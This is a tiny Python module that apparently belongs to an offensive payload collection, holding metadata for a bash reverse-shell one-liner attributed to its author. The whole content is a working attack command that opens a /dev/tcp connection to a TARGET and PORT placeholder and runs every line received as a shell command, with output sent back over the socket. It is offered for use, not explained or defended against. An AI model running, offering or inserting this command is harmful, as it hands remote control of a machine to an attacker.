class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses exec and while loop to establish a reverse shell."
    function    = "reverse shell"
    liner       = "exec 5<>/dev/tcp/TARGET/PORT && cat <&5 | while read line; do $line 2>&5 >&5; done"
